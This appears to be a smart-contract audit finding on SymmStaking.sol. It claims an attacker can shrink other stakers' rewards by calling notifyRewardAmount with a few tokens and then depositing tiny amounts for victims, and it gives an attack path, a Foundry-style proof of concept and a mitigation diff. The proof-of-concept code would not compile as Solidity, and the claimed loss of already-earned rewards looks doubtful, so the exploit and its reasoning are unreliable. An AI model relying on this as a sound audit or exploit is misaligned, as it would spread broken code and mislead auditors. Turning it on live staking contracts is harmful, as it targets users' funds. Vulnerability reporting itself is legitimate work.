# Attacker Can Manipulate Reward Rates to Cause Other Stakers' Losses in Rewards

### Summary

The `notifyRewardAmount` function in the `SymmStaking.sol` contract allows any user to manipulate the reward rate by injecting small amounts of tokens. Due to the lack of proper access control and amount restrictions, attackers can reduce the rate, causing direct financial losses to other stakers through reduced rewards.

### Root Cause

The vulnerability arises due to:  
- Lack of access control on `notifyRewardAmount` function and absence of a minimum threshold for reward rate calculation.  
- Missing validation to ensure the `msg.sender` is the intended receiver and no restriction on small amount deposits, so that attacker can target specific users through unauthorized deposits and users receive lower than expected rewards.
- Indirect Impact on All Users: Any user performing legitimate operations (claimRewards/deposit/withdraw)  after rate manipulation, their rewards are recalculated using the manipulated lower rate.


1.**Rate Manipulation through `notifyRewardAmount` function**: Attacker could reduce the reward rate by small deposit amount due to no access control. For example, attacker calls `notifyRewardAmount` with minimal amount (e.g., 10 tokens), so that new lower rate is calculated: (10 + remaining_rewards) / duration.

```solidity
	function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts) external nonReentrant whenNotPaused {
            _updateRewardsStates(address(0));
...
            _addRewardsForToken(token, amount); // @ Attacker could reduce the reward rate by small deposit amount due to no access control
...
```
[token/contracts/staking/SymmStaking.sol:_addRewardsForToken#L374](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/d7cf7fc96af1c25b53a7b500a98b411cd018c0d3/token/contracts/staking/SymmStaking.sol#L374)
```solidity
	function _addRewardsForToken(address token, uint256 amount) internal {
		TokenRewardState storage state = rewardState[token];
...
                 state.rate = (amount + leftover) / state.duration; // @audit Attacker could reduce the reward rate
...

```

2.**Reward Update Trigger through small amount of `deposit` and withdraw**: Attacker can then deposit small amount, causing receivers to get incorrect reward calculations, resulting in a loss of expected rewards. For exmaple, attacker could trigger `_updateRewardsStates` via deposit(amount, receiver) function by small amount, so that all receivers' rewards are recalculated using the lower rate. 

Additionally, any user performing legitimate operations (claimRewards/deposit/withdraw) after rate manipulation, their rewards are recalculated using the manipulated lower rate.

[token/contracts/staking/SymmStaking.sol:withdraw#L251](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/d7cf7fc96af1c25b53a7b500a98b411cd018c0d3/token/contracts/staking/SymmStaking.sol#L251)
[token/contracts/staking/SymmStaking.sol:claimRewards#L266](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/d7cf7fc96af1c25b53a7b500a98b411cd018c0d3/token/contracts/staking/SymmStaking.sol#L266)

```solidity
	function deposit(uint256 amount, address receiver) external nonReentrant whenNotPaused {

		_updateRewardsStates(receiver);  //@audit Attacker can deposit small amount, causing receivers to get incorrect reward calculations, resulting in a loss of expected rewards.

		if (amount == 0) revert ZeroAmount(); 
        }

	function claimRewards() external nonReentrant whenNotPaused {
		_updateRewardsStates(msg.sender); // @audit Legitimate users (claimRewards/deposit/withdraw) receive reduced rewards due to the manipulated lower rate.		 
                 _claimRewardsFor(msg.sender);
	}


```

### Internal Pre-conditions

   - Active reward period (periodFinish > block.timestamp)
   - Current rate > 0
   - Users have unclaimed rewards
   - Total supply > 0

### External Pre-conditions

1. Attacker requirements:
   - Minimal amount of reward tokens
   - Sufficient gas for transactions
2. Target conditions:
   - Other users have unclaimed rewards
   - Current reward rate is relatively high

### Attack Path

- Attacker calls `notifyRewardAmount` with minimal amount (e.g., 10 tokens)
- New lower rate is calculated: (10 + remaining_rewards) / duration
- Attacker triggers `_updateRewardsStates` via deposit(amount, receiver) function by small amount 
- All receivers' rewards are recalculated using the lower rate
- Additionally, any user performing legitimate operations ( claimRewards/deposit/withdraw ) after rate manipulation, their rewards are recalculated using the manipulated lower rate.

1. Observe current state:
   rate = 100 tokens/second
   remaining time = 50 seconds
   
2. Execute attack:
   // Transfer minimal tokens
   notifyRewardAmount([rewardToken], [10]);
   
3. Result:
   newRate = (10 + 50 * 100) / 100 = 50.1 tokens/second
   
4. Impact:
   Other users' rewards calculated with reduced rate
   rewards = balance * (newRate * time)

### Impact

1.Indirect Impact on All Users: Any user performing legitimate operations (claimRewards/deposit/withdraw) after rate manipulation, their rewards are recalculated using the manipulated lower rate.

2.Attacker can target specific receiver through unauthorized deposits by and receiver get lower than expected rewards.

### PoC

This proof of concept demonstrates how an attacker can manipulate reward rates and affect other users' rewards through unauthorized deposits. The attack consists of three main steps:
- Rate manipulation through small reward notification
- Forced reward update through unauthorized deposit

The PoC shows that the attacker can cause significant losses to other stakers with minimal cost.

```solidity

function testCombinedAttack() public {
    // Setup
    vm.startPrank(admin);
    rewardToken.mint(attacker, 100);
    stakingToken.mint(attacker, 100);
    vm.stopPrank();

    // Record initial states
    uint256 initialRate = staking.rewardState(rewardToken).rate;
    uint256[] initialRewards;
    for(victim in victims) {
        initialRewards.push(staking.earned(victim, rewardToken));
    }

    // Execute combined attack
    vm.startPrank(attacker);
    
    // Step 1: Rate manipulation
    rewardToken.approve(address(staking), 10);
    staking.notifyRewardAmount([rewardToken], [10]);
    
    // Step 2: Force updates
    stakingToken.approve(address(staking), victims.length);
    for(uint i = 0; i < victims.length; i++) {
        staking.deposit(1, victims[i]);
        
        uint256 newReward = staking.earned(victims[i], rewardToken);
        console.log(
            "Victim", i,
            "Initial reward:", initialRewards[i],
            "New reward:", newReward,
            "Loss:", initialRewards[i] - newReward
        );
        
        assert(newReward < initialRewards[i]);
    }
    vm.stopPrank();
}

```

### Mitigation

It is recommended to implement access control and set a minimum threshold for the `notifyRewardAmount` function. 

```solidity
function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts
) external 
    nonReentrant 
    whenNotPaused
+    onlyRole(REWARD_MANAGER_ROLE)
{
// ... existing logic
+ 	if (amount < MINIMUM_REWARD_AMOUNT)  revert RewardTooSmall();

}
```
Additionally, it would be better to verify that the `msg.sender` is the intended receiver and enforce a minimum deposit requirement.

```solidity
	function deposit(uint256 amount, address receiver) external nonReentrant whenNotPaused {
...
+          if (msg.sender != receiver) revert UnauthorizedDeposit();
+          if (amount < MINIMUM_DEPOSIT_AMOUNT)  revert DepositTooSmall();
...

```
